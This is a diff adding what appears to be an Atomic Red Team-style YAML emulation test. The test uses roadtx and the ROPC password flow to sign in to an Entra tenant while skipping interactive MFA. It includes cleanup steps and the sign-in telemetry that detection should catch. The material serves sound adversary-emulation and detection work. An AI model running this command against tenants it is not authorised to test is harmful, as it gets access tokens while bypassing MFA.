@@ -1,0 +1,65 @@
+attack_technique: T1078.001
+display_name: "Defense Evasion – ROPC Legacy Authentication (MFA Bypass)"
+atomic_tests:
+  - name: "Resource Owner Password Credentials flow via roadtx"
+    auto_generated_guid: a7b8c9d0-e1f2-3456-abcd-456789012306
+    description: |
+      Authenticates using ROPC (username + password, no browser/MFA prompt)
+      against an Entra tenant that has not blocked legacy auth. ROPC bypasses
+      MFA because it uses a non-interactive flow exempt from most CA policies
+      enforcing MFA. Wraps roadtx auth with username/password flags.
+    supported_platforms:
+      - windows
+      - linux
+      - macos
+    input_arguments:
+      tenant_id:
+        description: "Entra tenant ID of the lab tenant."
+        type: String
+        default: "00000000-0000-0000-0000-000000000000"
+      username:
+        description: "Lab account UPN."
+        type: String
+      password:
+        description: "Lab account password."
+        type: String
+      client_id:
+        description: "OAuth client ID supporting ROPC (public client)."
+        type: String
+        default: "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
+      resource:
+        description: "Target resource URI."
+        type: String
+        default: "https://graph.microsoft.com"
+      token_output_path:
+        description: "Path to write the resulting token cache file."
+        type: Path
+        default: "#{token_cache_path}"
+    executor:
+      name: powershell
+      command: |
+        roadtx auth `
+          --username '#{username}' `
+          --password '#{password}' `
+          --client '#{client_id}' `
+          --resource '#{resource}' `
+          --tenant '#{tenant_id}' `
+          --tokenfile '#{token_output_path}'
+    cleanup_command: |
+      if (Test-Path -LiteralPath '#{token_output_path}') {
+          Remove-Item -LiteralPath '#{token_output_path}' -Force
+      }
+    references:
+      - "https://learn.microsoft.com/en-us/azure/active-directory/develop/v2-oauth-ropc"
+    auth_profile: "ropc"
+    defense_evasion: "ROPC bypasses interactive MFA; targets tenants missing legacy-auth block CA policy"
+    requires_token: false
+    expected_telemetry:
+      - source: entra_signin
+        match:
+          clientAppUsed: "Other clients"
+          authenticationRequirement: "singleFactorAuthentication"
+        within_minutes: 10
+    exercises_chokepoint:
+      id: "DC-EVAS-003"
+      url: "https://detectionchokepoints.com/evasion/ropc-legacy-auth"
